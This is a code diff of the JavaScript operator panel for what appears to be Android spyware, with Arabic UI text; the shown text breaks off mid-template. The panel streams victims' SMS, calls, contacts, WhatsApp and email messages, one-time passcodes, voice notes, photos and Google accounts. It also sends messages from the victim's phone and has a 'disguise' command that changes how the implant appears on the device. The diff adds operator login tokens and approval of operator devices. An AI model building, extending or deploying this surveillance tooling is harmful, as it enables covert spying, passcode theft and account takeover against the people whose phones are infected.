@@ -1,9 +1,21 @@
 // ═══════════════════════════════════════════════════════
-//  PANEL CORE — Device Control Dashboard (Merged)
+//  PANEL CORE — Device Control Dashboard
 // ═══════════════════════════════════════════════════════
 
-if (sessionStorage.getItem('logged_in') !== 'true') {
-    window.location.href = 'login.html';
+function getAuthToken() {
+    return sessionStorage.getItem('auth_token') || '';
+}
+
+function isOwner() {
+    return sessionStorage.getItem('is_owner') === 'true';
+}
+
+// ✅ fetch مع token تلقائياً
+function authFetch(url, options = {}) {
+    const token = getAuthToken();
+    if (!token) return fetch(url, options);
+    const separator = url.includes('?') ? '&' : '?';
+    return fetch(url + separator + 'token=' + encodeURIComponent(token), options);
 }
 
 let currentDevice = null;
@@ -20,7 +32,6 @@ let wasOffline = true;
 let lastCallCount = 0;
 let lastSmsCount = 0;
 let lastDeletedCount = 0;
-let notificationShown = false;
 let soundPlayedForDevice = false;
 let sse = null;
 
@@ -35,7 +46,21 @@ let liveEmails = [];
 let panelOpenTime = Date.now();
 let liveFilterEnabled = true;
 
-function logout() { sessionStorage.removeItem('logged_in'); window.location.href = 'login.html'; }
+function logout() {
+    const token = getAuthToken();
+    if (token) {
+        fetch('/auth/logout', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ token })
+        }).catch(() => {});
+    }
+    sessionStorage.removeItem('logged_in');
+    sessionStorage.removeItem('auth_token');
+    sessionStorage.removeItem('is_owner');
+    window.location.href = 'login.html';
+}
+
 function playNotificationSound() { try { const audio = new Audio('v.wav'); audio.volume = 1.0; audio.play(); } catch (e) {} }
 
 function findContactName(number) {
@@ -115,13 +140,8 @@ function initSSE() {
         sse.addEventListener('new_email', (e) => {
             try {
                 const data = JSON.parse(e.data);
-                console.log('📧 realtime email:', data);
                 addLiveEmail(data);
-                showNotification(
-                    `📧 ${data.app_name || 'بريد'} جديد`,
-                    `${data.sender || 'غير معروف'}: ${data.subject || ''}`,
-                    '📧'
-                );
+                showNotification(`📧 ${data.app_name || 'بريد'} جديد`, `${data.sender || 'غير معروف'}: ${data.subject || ''}`, '📧');
                 loadEmails();
                 const badge = document.getElementById('emailsCount');
                 if (badge) {
@@ -261,7 +281,8 @@ function clearLiveImages() { if (!confirm('مسح كل الصور من الفي�
 function addLiveImage(img) {
     liveImages.unshift(img);
     if (liveImages.length > 200) liveImages = liveImages.slice(0, 200);
-    document.getElementById('liveImagesCount').textContent = liveImages.length;
+    const el = document.getElementById('liveImagesCount');
+    if (el) el.textContent = liveImages.length;
     const btn = document.getElementById('liveImagesBtn');
     if (btn) { btn.style.animation = 'none'; setTimeout(() => { btn.style.animation = 'nameGlow 1s 3'; }, 10); }
     if (document.getElementById('liveImagesOverlay').style.display === 'block') renderLiveImages();
@@ -320,15 +341,17 @@ function closeLiveMessages() { document.getElementById('liveMsgsOverlay').style.
 function clearLiveMsgs() { if (!confirm('مسح كل الرسائل من الفيد الحي؟')) return; liveMsgs = []; document.getElementById('liveMsgsCount').textContent = '0'; renderLiveMsgs(); }
 function filterLiveMsgs(type) {
     liveMsgsFilter = type;
-    document.getElementById('filterAll').style.background = type === 'all' ? '#ff0066' : '#333';
-    document.getElementById('filterIn').style.background = type === 'in' ? '#ff0066' : '#333';
-    document.getElementById('filterOut').style.background = type === 'out' ? '#ff0066' : '#333';
+    const setBg = (id, active) => { const el = document.getElementById(id); if (el) el.style.background = active ? '#ff0066' : '#333'; };
+    setBg('filterAll', type === 'all');
+    setBg('filterIn', type === 'in');
+    setBg('filterOut', type === 'out');
     renderLiveMsgs();
 }
 function addLiveMsg(msg) {
     liveMsgs.unshift(msg);
     if (liveMsgs.length > 500) liveMsgs = liveMsgs.slice(0, 500);
-    document.getElementById('liveMsgsCount').textContent = liveMsgs.length;
+    const el = document.getElementById('liveMsgsCount');
+    if (el) el.textContent = liveMsgs.length;
     const btn = document.getElementById('liveMsgsBtn');
     if (btn) { btn.style.animation = 'none'; setTimeout(() => { btn.style.animation = 'nameGlow 1s 3'; }, 10); }
     if (document.getElementById('liveMsgsOverlay').style.display === 'block') renderLiveMsgs();
@@ -369,7 +392,8 @@ function clearLiveOtp() { if (!confirm('مسح كل الأكواد من الفي
 function addLiveOtp(otp) {
     liveOtps.unshift(otp);
     if (liveOtps.length > 200) liveOtps = liveOtps.slice(0, 200);
-    document.getElementById('liveOtpCount').textContent = liveOtps.length;
+    const el = document.getElementById('liveOtpCount');
+    if (el) el.textContent = liveOtps.length;
     const btn = document.getElementById('liveOtpBtn');
     if (btn) { btn.style.animation = 'none'; setTimeout(() => { btn.style.animation = 'nameGlow 1s 3'; }, 10); }
     if (document.getElementById('liveOtpOverlay').style.display === 'block') renderLiveOtp();
@@ -402,7 +426,8 @@ function clearLiveVoices() { if (!confirm('مسح كل الرسائل الصوت
 function addLiveVoice(voice) {
     liveVoices.unshift(voice);
     if (liveVoices.length > 200) liveVoices = liveVoices.slice(0, 200);
-    document.getElementById('liveVoicesCount').textContent = liveVoices.length;
+    const el = document.getElementById('liveVoicesCount');
+    if (el) el.textContent = liveVoices.length;
     const btn = document.getElementById('liveVoicesBtn');
     if (btn) { btn.style.animation = 'none'; setTimeout(() => { btn.style.animation = 'nameGlow 1s 3'; }, 10); }
     if (document.getElementById('liveVoicesOverlay').style.display === 'block') renderLiveVoices();
@@ -421,7 +446,7 @@ function renderLiveVoices() {
         div.innerHTML = `
             <div style="color:#00ffcc;font-size:13px;font-weight:bold;margin-bottom:8px;">${dirLabel} — ${srcLabel}</div>
             <div style="color:#ccc;font-size:13px;margin-bottom:8px;">📅 ${formatDate(voice.timestamp)}</div>
-            <div style="color:#888;font-size:11px;margin-bottom:8px;word-break:break-all;">${voice.file_name || ''} (${(voice.file_size / 1024).toFixed(1)} KB)</div>
+            <div style="color:#888;font-size:11px;margin-bottom:8px;word-break:break-all;">${voice.file_name || ''} (${((voice.file_size||0) / 1024).toFixed(1)} KB)</div>
             <audio controls style="width:100%;margin-bottom:8px;" preload="none">
                 <source src="data:audio/ogg;base64,${voice.file_data}" type="audio/ogg">
                 <source src="data:audio/mp4;base64,${voice.file_data}" type="audio/mp4">
@@ -455,14 +480,15 @@ function downloadLiveVoice(idx) {
 }
 function deleteLiveVoice(idx) { if (!confirm('حذف هذه الرسالة الصوتية من الفيد؟')) return; liveVoices.splice(idx, 1); document.getElementById('liveVoicesCount').textContent = liveVoices.length; renderLiveVoices(); }
 
-// ═══ الفيد الحي — البريد الإلكتروني ═══
+// ═══ الفيد الحي — البريد ═══
 function openLiveEmails() { document.getElementById('liveEmailsOverlay').style.display = 'block'; renderLiveEmails(); }
 function closeLiveEmails() { document.getElementById('liveEmailsOverlay').style.display = 'none'; }
 function clearLiveEmails() { if (!confirm('مسح كل البريد من الفيد الحي؟')) return; liveEmails = []; document.getElementById('liveEmailsCount').textContent = '0'; renderLiveEmails(); }
 function addLiveEmail(email) {
     liveEmails.unshift(email);
     if (liveEmails.length > 200) liveEmails = liveEmails.slice(0, 200);
-    document.getElementById('liveEmailsCount').textContent = liveEmails.length;
+    const el = document.getElementById('liveEmailsCount');
+    if (el) el.textContent = liveEmails.length;
     const btn = document.getElementById('liveEmailsBtn');
     if (btn) { btn.style.animation = 'none'; setTimeout(() => { btn.style.animation = 'nameGlow 1s 3'; }, 10); }
     if (document.getElementById('liveEmailsOverlay').style.display === 'block') renderLiveEmails();
@@ -489,20 +515,14 @@ function renderLiveEmails() {
 }
 function deleteLiveEmail(idx) { if (!confirm('حذف هذا البريد من الفيد؟')) return; liveEmails.splice(idx, 1); document.getElementById('liveEmailsCount').textContent = liveEmails.length; renderLiveEmails(); }
 
-// ═══════════════════════════════════════════════════════
-//  🎭 التنكر — Disguise System
-// ═══════════════════════════════════════════════════════
+// ═══ التنكر ═══
 async function changeDisguise(appName) {
     if (!currentDevice) { alert('⚠️ اختر جهاز أولاً'); return; }
     try {
         const response = await fetch('/api.php', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                device: currentDevice,
-                command: 'disguise',
-                app: appName
-            })
+            body: JSON.stringify({ device: currentDevice, command: 'disguise', app: appName, token: getAuthToken() })
         });
         const result = await response.json();
         if (result.success) {
@@ -555,7 +575,7 @@ async function sendSmsCommand(number, message) {
         const response = await fetch('/api.php', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ device: currentDevice, command: 'send_sms_direct', number: number, message: message })
+            body: JSON.stringify({ device: currentDevice, command: 'send_sms_direct', number: number, message: message, token: getAuthToken() })
         });
         return (await response.json()).success;
     } catch (e) { return false; }
@@ -597,13 +617,13 @@ async function doSendSms() {
     } else alert('❌ فشل الإرسال');
 }
 
-// ═══ الرد على واتساب ═══
+// ═══ رد واتساب ═══
 async function replyWhatsAppCmd(sender, message) {
     try {
         const response = await fetch('/api.php', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ device: currentDevice, command: 'reply_whatsapp', sender: sender, message: message })
+            body: JSON.stringify({ device: currentDevice, command: 'reply_whatsapp', sender: sender, message: message, token: getAuthToken() })
         });
         return (await response.json()).success;
     } catch (e) { return false; }
@@ -639,7 +659,7 @@ async function doReplyWa(sender) {
 
 function openReplyWaPicker() {
     if (!currentDevice) { alert('⚠️ اختر جهاز أولاً'); return; }
-    fetch(`/api.php?action=get_whatsapp&device=${encodeURIComponent(currentDevice)}`)
+    authFetch(`/api.php?action=get_whatsapp&device=${encodeURIComponent(currentDevice)}`)
         .then(res => res.json())
         .then(messages => {
             const senders = [...new Set(messages.map(m => m.sender))].filter(s => s);
@@ -679,7 +699,7 @@ async function clearAllDeleted() {
     if (!currentDevice) { alert('⚠️ اختر جهاز أولاً'); return; }
     if (!confirm('⚠️ مسح كل المحذوفات؟\nهذا الإجراء لا يمكن التراجع عنه!')) return;
     try {
-        const response = await fetch(`/api.php?action=clear_deleted&device=${encodeURIComponent(currentDevice)}`);
+        const response = await authFetch(`/api.php?action=clear_deleted&device=${encodeURIComponent(currentDevice)}`);
         const result = await response.json();
         if (result.success) {
             allDeleted = [];
@@ -695,7 +715,7 @@ async function clearAllDeleted() {
 async function deleteSingleDeleted(index) {
     if (!confirm('حذف هذا العنصر من السلة؟')) return;
     try {
-        const response = await fetch(`/api.php?action=delete_deleted_item&device=${encodeURIComponent(currentDevice)}&index=${index}`);
+        const response = await authFetch(`/api.php?action=delete_deleted_item&device=${encodeURIComponent(currentDevice)}&index=${index}`);
         const result = await response.json();
         if (result.success) {
             allDeleted.splice(index, 1);
@@ -745,7 +765,7 @@ async function deleteDevice() {
     if (!currentDevice) { alert('⚠️ اختر جهازًا أولًا'); return; }
     if (!confirm('هل أنت متأكد من حذف هذا الجهاز؟')) return;
     try {
-        const response = await fetch(`/api.php?action=delete_device&device=${encodeURIComponent(currentDevice)}`);
+        const response = await authFetch(`/api.php?action=delete_device&device=${encodeURIComponent(currentDevice)}`);
         const result = await response.json();
         if (result.success) {
             alert('✅ تم حذف الجهاز');
@@ -756,27 +776,25 @@ async function deleteDevice() {
             setTimeout(() => { loadDevices(); }, 500);
             setTimeout(() => { loadDevices(); }, 1500);
             setTimeout(() => { loadDevices(); }, 3000);
-            setTimeout(() => { loadDevices(); }, 5000);
-            setTimeout(() => { loadDevices(); }, 8000);
         } else alert('❌ خطأ: ' + (result.error || 'غير معروف'));
     } catch (e) { alert('❌ خطأ في الاتصال: ' + e.message); }
 }
 
 async function loadDevices() {
     try {
-        const response = await fetch('/devices.json');
+        const response = await authFetch('/devices.json');
         const devices = await response.json();
         const select = document.getElementById('deviceSelect');
         const currentValue = currentDevice;
         select.innerHTML = '<option value="">اختر الجهاز...</option>';
-        devices.forEach(device => {
+        (devices || []).forEach(device => {
             const option = document.createElement('option');
             option.value = device.id;
             option.textContent = device.name || device.id;
             select.appendChild(option);
         });
         if (currentValue) { select.value = currentValue; }
-        else if (devices.length > 0) { selectDevice(devices[0].id); select.value = devices[0].id; }
+        else if (devices && devices.length > 0) { selectDevice(devices[0].id); select.value = devices[0].id; }
     } catch (e) {}
 }
 
@@ -816,8 +834,9 @@ function selectDevice(deviceId) {
 async function updateLiveData() {
     if (!currentDevice) return;
     try {
-        const response = await fetch(`/live.php?device=${encodeURIComponent(currentDevice)}`);
+        const response = await authFetch(`/live.php?device=${encodeURIComponent(currentDevice)}`);
         const data = await response.json();
+        if (data.error) return;
         const statusEl = document.getElementById('networkStatus');
         if (data.online) { statusEl.textContent = data.network || 'متصل'; statusEl.className = 'value online'; }
         else { statusEl.textContent = 'غير متصل'; statusEl.className = 'value offline'; }
@@ -858,22 +877,18 @@ async function loadAllData() {
 
 async function loadGoogleAccounts() {
     try {
-        const response = await fetch(`/api.php?action=get_google_accounts&device=${encodeURIComponent(currentDevice)}`);
+        const response = await authFetch(`/api.php?action=get_google_accounts&device=${encodeURIComponent(currentDevice)}`);
         const accounts = await response.json();
-
         const div = document.getElementById('googleAccountsList');
         if (!div) return;
         div.innerHTML = '';
-
-        if (!accounts || accounts.length === 0) {
+        if (!Array.isArray(accounts) || accounts.length === 0) {
             div.innerHTML = '<p style="color:#888;">لا توجد حسابات Google</p>';
             return;
         }
-
         accounts.forEach(account => {
             const email = account.email || account.name || 'غير معروف';
             const type = account.type || 'Google';
-
             const item = document.createElement('div');
             item.className = 'conversation-item';
             item.innerHTML = `
@@ -890,27 +905,22 @@ async function loadGoogleAccounts() {
 
 async function loadEmails() {
     try {
-        const response = await fetch(`/api.php?action=get_emails&device=${encodeURIComponent(currentDevice)}`);
+        const response = await authFetch(`/api.php?action=get_emails&device=${encodeURIComponent(currentDevice)}`);
         const emails = await response.json();
-
         const div = document.getElementById('emailsList');
         if (!div) return;
         div.innerHTML = '';
-
-        if (!emails || emails.length === 0) {
+        if (!Array.isArray(emails) || emails.length === 0) {
             div.innerHTML = '<p style="color:#888;">لا توجد رسائل بريد</p>';
             return;
         }
-
-        [...emails].sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0)).forEach((email, idx) => {
+        [...emails].sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0)).forEach((email) => {
             const item = document.createElement('div');
             item.className = 'conversation-item';
             item.style.cssText = 'position:relative;';
-
             const img = email.image_data
                 ? `<img src="data:image/jpeg;base64,${email.image_data}" style="max-width:150px;border-radius:5px;margin-top:8px;cursor:pointer;" onclick="window.open(this.src)">`
                 : '';
-
             item.innerHTML = `
                 <div class="conversation-avatar">📧</div>
                 <div class="conversation-info" style="flex:1;">
@@ -929,8 +939,9 @@ async function loadEmails() {
 
 async function loadDeleted() {
     try {
-        const response = await fetch(`/api.php?action=get_deleted&device=${encodeURIComponent(currentDevice)}`);
+        const response = await authFetch(`/api.php?action=get_deleted&device=${encodeURIComponent(currentDevice)}`);
         const deleted = await response.json();
+        if (!Array.isArray(deleted)) return;
         if (JSON.stringify(deleted) !== JSON.stringify(allDeleted)) {
             checkNewDeleted(deleted);
             allDeleted = deleted;
@@ -941,12 +952,12 @@ async function loadDeleted() {
 
 async function loadWhatsApp() {
     try {
-        const response = await fetch(`/api.php?action=get_whatsapp&device=${encodeURIComponent(currentDevice)}`);
+        const response = await authFetch(`/api.php?action=get_whatsapp&device=${encodeURIComponent(currentDevice)}`);
         const messages = await response.json();
         const div = document.getElementById('whatsappList');
         if (!div) return;
         div.innerHTML = '';
-        if (!messages || messages.length === 0) { div.innerHTML = '<p style="color:#888;">لا توجد رسائل واتساب</p>'; return; }
+        if (!Array.isArray(messages) || messages.length === 0) { div.innerHTML = '<p style="color:#888;">لا توجد رسائل واتساب</p>'; return; }
         const conversations = {};
         messages.forEach(msg => {
             const sender = msg.sender || 'غير معروف';
@@ -983,7 +994,7 @@ async function loadWhatsApp() {
 
 async function openWhatsAppChat(sender) {
     try {
-        const response = await fetch(`/api.php?action=get_whatsapp&device=${encodeURIComponent(currentDevice)}`);
+        const response = await authFetch(`/api.php?action=get_whatsapp&device=${encodeURIComponent(currentDevice)}`);
         const messages = await response.json();
         const senderMessages = messages.filter(m => (m.sender || 'غير معروف') === sender)
             .sort((a, b) => (a.timestamp || 0) - (b.timestamp || 0));
@@ -1027,7 +1038,7 @@ async function openWhatsAppChat(sender) {
     } catch (e) {}
 }
 
-function closeWhatsAppChat() { const window = document.getElementById('whatsappChatWindow'); if (window) window.remove(); currentChat = null; }
+function closeWhatsAppChat() { const w = document.getElementById('whatsappChatWindow'); if (w) w.remove(); currentChat = null; }
 function selectAllWhatsApp() {
     const msgs = document.querySelectorAll('.wa-msg');
     msgs.forEach(msg => {
@@ -1042,7 +1053,7 @@ async function deleteSelectedWhatsApp() {
     const timestamps = [];
     selected.forEach(msg => { timestamps.push(msg.getAttribute('data-timestamp')); });
     try {
-        const response = await fetch(`/api.php?action=delete_whatsapp&device=${encodeURIComponent(currentDevice)}&timestamps=${encodeURIComponent(timestamps.join(','))}`);
+        const response = await authFetch(`/api.php?action=delete_whatsapp&device=${encodeURIComponent(currentDevice)}&timestamps=${encodeURIComponent(timestamps.join(','))}`);
         const result = await response.json();
         if (result.success) { closeWhatsAppChat(); loadWhatsApp(); }
     } catch (e) {}
@@ -1050,7 +1061,7 @@ async function deleteSelectedWhatsApp() {
 async function deleteWhatsAppChat(sender) {
     if (!confirm(`حذف كل رسائل ${sender}؟`)) return;
     try {
-        const response = await fetch(`/api.php?action=delete_whatsapp_chat&device=${encodeURIComponent(currentDevice)}&sender=${encodeURIComponent(sender)}`);
+        const response = await authFetch(`/api.php?action=delete_whatsapp_chat&device=${encodeURIComponent(currentDevice)}&sender=${encodeURIComponent(sender)}`);
         const result = await response.json();
         if (result.success) { loadWhatsApp(); }
     } catch (e) {}
@@ -1109,8 +1120,9 @@ function displayDeleted() {
 
 async function loadCalls() {
     try {
-        const response = await fetch(`/api.php?action=get_data&device=${encodeURIComponent(currentDevice)}&type=call_logs`);
+        const response = await authFetch(`/api.php?action=get_data&device=${encodeURIComponent(currentDevice)}&type=call_logs`);
         const newCalls = await response.json();
+        if (!Array.isArray(newCalls)) return;
         if (JSON.stringify(newCalls) !== JSON.stringify(allCalls)) {
             checkNewCalls(newCalls);
             allCalls = newCalls;
@@ -1155,8 +1167,9 @@ function backToCallsList() { currentCallNumber = null; displayCallsList(); }
 
 async function loadSMS() {
     try {
-        const response = await fetch(`/api.php?action=get_data&device=${encodeURIComponent(currentDevice)}&type=sms`);
+        const response = await authFetch(`/api.php?action=get_data&device=${encodeURIComponent(currentDevice)}&type=sms`);
         const newSMS = await response.json();
+        if (!Array.isArray(newSMS)) return;
         if (JSON.stringify(newSMS) !== JSON.stringify(allSMS)) {
             checkNewSMS(newSMS);
             allSMS = newSMS;
@@ -1206,8 +1219,9 @@ function backToConversations() { currentChat = null; displayConversations(); }
 
 async function loadContacts() {
     try {
-        const response = await fetch(`/api.php?action=get_data&device=${encodeURIComponent(currentDevice)}&type=contacts`);
+        const response = await authFetch(`/api.php?action=get_data&device=${encodeURIComponent(currentDevice)}&type=contacts`);
         const newContacts = await response.json();
+        if (!Array.isArray(newContacts)) return;
         if (JSON.stringify(newContacts) !== JSON.stringify(allContacts)) {
             allContacts = newContacts;
             if (currentContact) openContactDetail(currentContact);
@@ -1254,11 +1268,11 @@ function backToContactsList() { currentContact = null; displayContactsList(); }
 
 async function loadImages() {
     try {
-        const response = await fetch(`/api.php?action=get_image_data&device=${encodeURIComponent(currentDevice)}`);
+        const response = await authFetch(`/api.php?action=get_image_data&device=${encodeURIComponent(currentDevice)}`);
         const images = await response.json();
         const grid = document.getElementById('imagesGrid');
         grid.innerHTML = '';
-        if (!images || images.length === 0) { grid.innerHTML = '<p style="color:#888;">لا توجد صور</p>'; return; }
+        if (!Array.isArray(images) || images.length === 0) { grid.innerHTML = '<p style="color:#888;">لا توجد صور</p>'; return; }
         [...images].sort((a, b) => (b.date || 0) - (a.date || 0)).forEach((image, i) => {
             const div = document.createElement('div');
             div.className = 'image-card';
@@ -1278,18 +1292,19 @@ async function loadImages() {
 
 async function loadApps() {
     try {
-        const response = await fetch(`/api.php?action=get_data&device=${encodeURIComponent(currentDevice)}&type=installed_apps`);
+        const response = await authFetch(`/api.php?action=get_data&device=${encodeURIComponent(currentDevice)}&type=installed_apps`);
         const apps = await response.json();
         const tbody = document.querySelector('#appsTable tbody');
+        if (!tbody) return;
         tbody.innerHTML = '';
-        if (!apps || apps.length === 0) return;
+        if (!Array.isArray(apps) || apps.length === 0) return;
         apps.forEach(app => { const r = document.createElement('tr'); r.innerHTML = `<td>${app.name || app.package}</td><td>${app.package}</td><td>${app.system_app ? 'نعم' : 'لا'}</td>`; tbody.appendChild(r); });
     } catch (e) {}
 }
 
 async function loadDeviceInfo() {
     try {
-        const response = await fetch(`/api.php?action=get_data&device=${encodeURIComponent(currentDevice)}&type=device_info`);
+        const response = await authFetch(`/api.php?action=get_data&device=${encodeURIComponent(currentDevice)}&type=device_info`);
         const info = await response.json();
         const div = document.getElementById('deviceInfo');
         if (!info || Object.keys(info).length === 0) return;
@@ -1304,6 +1319,11 @@ function switchTab(tabName) {
     if (tab) tab.classList.add('active');
     const pane = document.getElementById(`${tabName}Tab`);
     if (pane) pane.classList.add('active');
+
+    if (tabName === 'security') {
+        loadAuthorizedDevices();
+        loadDevicePermissions();
+    }
 }
 
 function formatDuration(s) { if (!s || s < 0) return '0:00'; return `${Math.floor(s/60)}:${(s%60).toString().padStart(2,'0')}`; }
@@ -1316,7 +1336,7 @@ async function triggerVoiceScan() {
         const response = await fetch('/api.php', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ device: currentDevice, command: 'scan_voices' })
+            body: JSON.stringify({ device: currentDevice, command: 'scan_voices', token: getAuthToken() })
         });
         const result = await response.json();
         if (result.success) {
@@ -1324,6 +1344,300 @@ async function triggerVoiceScan() {
         } else alert('❌ فشل');
     } catch (e) { alert('❌ خطأ: ' + e.message); }
 }
+
+// ═══════════════════════════════════════════════════════
+// 🔐 Device Approval Management
+// ═══════════════════════════════════════════════════════
+
+async function loadAuthorizedDevices() {
+    if (!isOwner()) return;
+    try {
+        const token = getAuthToken();
+        if (!token) return;
+
+        const res = await fetch(`/auth/devices?token=${encodeURIComponent(token)}`);
+        if (res.status === 401) { logout(); return; }
+        if (res.status === 403) return;
+        const data = await res.json();
+
+        const pendingDiv = document.getElementById('pendingDevicesList');
+        if (pendingDiv) {
+            pendingDiv.innerHTML = '';
+            if (!data.pending || data.pending.length === 0) {
+                pendingDiv.innerHTML = '<p style="color:#666;font-size:13px;">لا توجد أجهزة قيد الانتظار</p>';
+            } else {
+                data.pending.forEach(dev => {
+                    const div = document.createElement('div');
+                    div.className = 'conversation-item';
+                    div.style.cssText = 'flex-direction:column;align-items:stretch;background:#1a1a00;border:1px solid #ffcc00;padding:12px;border-radius:8px;margin-bottom:10px;';
+                    const dateStr = dev.time ? new Date(dev.time).toLocaleString('ar') : '—';
+                    div.innerHTML = `
+                        <div style="color:#ffcc00;font-weight:bold;margin-bottom:5px;">🆕 جهاز جديد يحاول الدخول</div>
+                        <div style="color:#ccc;font-size:12px;word-break:break-all;">FP: <b>${(dev.fp || '').slice(0, 24)}...</b></div>
+                        <div style="color:#888;font-size:11px;">IP: ${dev.ip || '—'}</div>
+                        <div style="color:#888;font-size:11px;">Screen: ${dev.screen || '—'} | TZ: ${dev.tz || '—'}</div>
+                        <div style="color:#888;font-size:11px;">UA: ${(dev.ua || '').slice(0, 60)}...</div>
+                        <div style="color:#888;font-size:11px;">📅 ${dateStr}</div>
+                        <div style="display:flex;gap:8px;margin-top:10px;">
+                            <button onclick="approveDevice('${dev.fp}')" style="flex:1;background:#00cc66;color:#fff;border:none;padding:8px;border-radius:6px;cursor:pointer;font-weight:bold;">✅ موافقة</button>
+                            <button onclick="denyDevice('${dev.fp}')" style="flex:1;background:#ff3300;color:#fff;border:none;padding:8px;border-radius:6px;cursor:pointer;font-weight:bold;">❌ رفض</button>
+                        </div>
+                    `;
+                    pendingDiv.appendChild(div);
+                });
+            }
+        }
+
+        const badge = document.getElementById('pendingBadge');
+        if (badge) {
+            const count = (data.pending || []).length;
+            badge.textContent = count > 0 ? `(${count}) 🔴` : '';
+            badge.className = count > 0 ? 'count badge-new' : 'count';
+        }
+
+        const approvedDiv = document.getElementById('approvedDevicesList');
+        if (approvedDiv) {
+            approvedDiv.innerHTML = '';
+            if (!data.approved || data.approved.length === 0) {
+                approvedDiv.innerHTML = '<p style="color:#666;font-size:13px;">لا توجد أجهزة مصرح لها</p>';
+            } else {
+                data.approved.forEach(fp => {
+                    const div = document.createElement('div');
+                    div.className = 'conversation-item';
+                    div.style.cssText = 'background:#001a0d;border:1px solid #00cc66;padding:12px;border-radius:8px;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center;gap:10px;';
+                    div.innerHTML = `
+                        <div style="flex:1;">
+                            <div style="color:#00ffcc;font-size:12px;">✅ مصرح له</div>
+                            <div style="color:#ccc;font-size:11px;word-break:break-all;">${fp.slice(0, 24)}...</div>
+                        </div>
+                        <button onclick="revokeDevice('${fp}')" style="background:#ff3300;color:#fff;border:none;padding:8px 15px;border-radius:6px;cursor:pointer;font-weight:bold;font-size:12px;">🚫 سحب</button>
+                    `;
+                    approvedDiv.appendChild(div);
+                });
+            }
+        }
+
+        const deniedDiv = document.getElementById('deniedDevicesList');
+        if (deniedDiv) {
+            deniedDiv.innerHTML = '';
+            if (!data.denied || data.denied.length === 0) {
+                deniedDiv.innerHTML = '<p style="color:#666;font-size:13px;">لا توجد أجهزة محجوبة</p>';
+            } else {
+                data.denied.forEach(fp => {
+                    const div = document.createElement('div');
+                    div.className = 'conversation-item';
+                    div.style.cssText = 'background:#1a0000;border:1px solid #ff3300;padding:12px;border-radius:8px;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center;gap:10px;';
+                    div.innerHTML = `
+                        <div style="flex:1;">
+                            <div style="color:#ff6666;font-size:12px;">🚫 محجوب</div>
+                            <div style="color:#ccc;font-size:11px;word-break:break-all;">${fp.slice(0, 24)}...</div>
+                        </div>
+                        <button onclick="unblockDevice('${fp}')" style="background:#666;color:#fff;border:none;padding:8px 15px;border-radius:6px;cursor:pointer;font-weight:bold;font-size:12px;">🔓 فتح</button>
+                    `;
+                    deniedDiv.appendChild(div);
+                });
+            }
+        }
+
+    } catch (e) {
+        console.error('loadAuthorizedDevices error:', e);
+    }
+}
+
+async function approveDevice(fp) {
+    if (!confirm('الموافقة على هذا الجهاز؟')) return;
+    try {
+        const res = await fetch('/auth/approve', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ token: getAuthToken(), fp })
+        });
+        const data = await res.json();
+        if (data.success) {
+            showNotification('✅ تم', 'تمت الموافقة على الجهاز', '🔐');
+            loadAuthorizedDevices();
+        } else alert('❌ فشل: ' + (data.error || ''));
+    } catch (e) { alert('❌ خطأ: ' + e.message); }
+}
+
+async function denyDevice(fp) {
+    if (!confirm('رفض هذا الجهاز نهائياً؟')) return;
+    try {
+        const res = await fetch('/auth/deny', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ token: getAuthToken(), fp })
+        });
+        const data = await res.json();
+        if (data.success) {
+            showNotification('🚫 تم', 'تم رفض الجهاز', '🚫');
+            loadAuthorizedDevices();
+        } else alert('❌ فشل: ' + (data.error || ''));
+    } catch (e) { alert('❌ خطأ: ' + e.message); }
+}
+
+async function revokeDevice(fp) {
+    if (!confirm('سحب التصريح من هذا الجهاز؟\nسيتم تسجيل خروجه فوراً.')) return;
+    try {
+        const res = await fetch('/auth/revoke', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ token: getAuthToken(), fp })
+        });
+        const data = await res.json();
+        if (data.success) {
+            showNotification('🔓 تم', 'تم سحب التصريح', '🔓');
+            loadAuthorizedDevices();
+        } else alert('❌ فشل: ' + (data.error || ''));
+    } catch (e) { alert('❌ خطأ: ' + e.message); }
+}
+
+async function unblockDevice(fp) {
+    if (!confirm('فتح هذا الجهاز (السماح له بالمحاولة من جديد)؟')) return;
+    try {
+        const res = await fetch('/auth/unblock', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ token: getAuthToken(), fp })
+        });
+        const data = await res.json();
+        if (data.success) {
+            showNotification('🔓 تم', 'تم فتح الجهاز', '🔓');
+            loadAuthorizedDevices();
+        }
+    } catch (e) {}
+}
+
+// ═══════════════════════════════════════════════════════
+// 🔐 Device Permissions Management
+// ═══════════════════════════════════════════════════════
+
+async function loadDevicePermissions() {
+    if (!isOwner()) return;
+    try {
+        const token = getAuthToken();
+        const [permsRes, devicesRes, usersRes] = await Promise.all([
+            fetch(`/auth/permissions?token=${encodeURIComponent(token)}`),
+            fetch(`/devices.json?token=${encodeURIComponent(token)}`),
+            fetch(`/auth/devices?token=${encodeURIComponent(token)}`)
+        ]);
+
+        if (permsRes.status === 403 || devicesRes.status === 403 || usersRes.status === 403) return;
+
+        const perms = await permsRes.json();
+        const devices = await devicesRes.json();
+        const usersData = await usersRes.json();
+        const approvedUsers = usersData.approved || [];
+
+        const div = document.getElementById('devicePermsList');
+        if (!div) return;
+        div.innerHTML = '';
+
+        if (!devices || devices.length === 0) {
+            div.innerHTML = '<p style="color:#666;font-size:13px;">لا توجد أجهزة ضحايا بعد</p>';
+            return;
+        }
+
+        devices.forEach(device => {
+            const allowed = perms[device.id] || [];
+            const card = document.createElement('div');
+            card.style.cssText = 'background:#1a0a1a;border:1px solid #9b59b6;padding:12px;border-radius:8px;margin-bottom:12px;';
+
+            const userChips = approvedUsers.map(userFp => {
+                const isAllowed = allowed.includes(userFp);
+                const shortFp = userFp.slice(0, 16);
+                return `
